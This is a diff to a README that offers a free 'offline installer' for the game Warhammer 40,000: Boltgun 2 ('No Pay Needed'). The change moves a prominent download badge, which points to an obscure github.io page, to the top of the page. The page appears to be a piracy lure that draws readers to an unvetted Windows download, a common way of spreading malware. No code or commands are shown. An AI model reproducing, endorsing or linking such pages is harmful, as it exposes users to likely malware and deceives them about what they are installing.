@@ -20,6 +20,12 @@
   <img src="https://readme-typing-svg.herokuapp.com?color=F9A825&size=28&center=true&vCenter=true&width=900&lines=🎮+Warhammer%2040%2C000%3A%20Boltgun%202+Offline+Installer;⭐+Professional+Grade+Software;🌟+Full+Offline+Installation+2026;🔥+No+Pay+Needed" />
 </p>
 
+<div align="center">
+
+[![Download](https://img.shields.io/badge/⬇_Download_Warhammer%2040%2C000%3A%20Boltgun%202-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
+
+</div>
+
 ---
 
 ## ❌ Problem: Games are expensive and require internet
@@ -61,12 +67,6 @@
 ### Step 2: Install and launch
 
 - Run the installer → Follow instructions → Launch Warhammer 40,000: Boltgun 2
-
-<div align="center">
-
-[![Download](https://img.shields.io/badge/⬇_Download_Warhammer%2040%2C000%3A%20Boltgun%202-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
-
-</div>
 
 ---
 
